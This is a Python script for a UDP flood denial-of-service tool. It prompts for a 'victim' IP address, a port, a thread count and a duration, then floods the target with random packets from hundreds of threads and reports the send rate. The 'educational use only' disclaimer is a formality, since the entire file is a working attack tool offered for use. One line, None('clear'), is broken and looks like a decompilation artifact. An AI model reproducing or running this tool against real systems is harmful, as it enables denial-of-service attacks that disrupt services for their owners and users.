import socket
import threading
import time
import random
import os
import sys
GREEN = '\x1b[92m'
RESET = '\x1b[0m'

def clear():
    if os.name == 'nt':
        os.system('cls')
        return
    None('clear')

def print_banner():
    banner = f"{GREEN}\n THE HELLISH WI-FI UDP-Flood-DoS T00L. (there was a banner btw)  \n{RESET}"
    print(banner)

def disclaimer():
    print(f'{GREEN}DISCLAIMER: This tool is for educational use only. The author is not responsible for any misuse.{RESET}')
    input(f'{GREEN}Press Enter to accept and continue...{RESET}')

packet_count = 0
count_lock = threading.Lock()
stop_event = threading.Event()

def flood(target_ip, target_port, packet_size=1024):
    global packet_count
    data = random._urandom(packet_size)
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(data, (target_ip, target_port))
            s.close()
            with count_lock:
                packet_count += 1
        except OSError as e:
            if e.winerror ==10048:
                pass
        except:
            pass

def stats_printer():
    last = 0
    while not stop_event.is_set():
        time.sleep(1)
        with count_lock:
            current = packet_count
            pps = current - last
            last = current
            print(f'\r{GREEN}[*] Total packets: {current:,} | Packages per second: {pps:,}     {RESET}', end='', flush=True)
    print()

def main():
    clear()
    print_banner()
    disclaimer()
    clear()
    print_banner()
    target_ip = input(f'{GREEN}IP of the victim(education purpose only): {RESET}')
    target_port = int(input(f'{GREEN}Port (default 80): {RESET}') or '80')
    threads = int(input(f'{GREEN}Number of threads (default 500): {RESET}') or '500')
    duration = int(input(f'{GREEN}Attack duration in seconds (0 = infinite): {RESET}') or '0')
    print(f'\n{GREEN}[*] Starting UDP-Flood-DoS on {target_ip}:{target_port}, threads: {threads}{RESET}')
    for _ in range(threads):
        t = threading.Thread(target=flood, args=(target_ip, target_port))
        t.daemon = True
        t.start()
    stats_thread = threading.Thread(target=stats_printer)
    stats_thread.daemon = True
    stats_thread.start()
    if duration > 0:
        time.sleep(duration)
        stop_event.set()
        print(f'\n{GREEN}[+] Attack finished after {duration} seconds.{RESET}')
    else:
        print(f'{GREEN}[+] Attack running. Press Ctrl+C to stop.{RESET}')
        try:
            while True:
                time.sleep(0.5)
        except KeyboardInterrupt:
            stop_event.set()
            print(f'\n{GREEN}[+] Attack stopped by user.{RESET}')
    time.sleep(1)
    print(f'{GREEN}[+] Total packets sent: {packet_count:,}{RESET}')

if __name__ =='__main__':
    main()
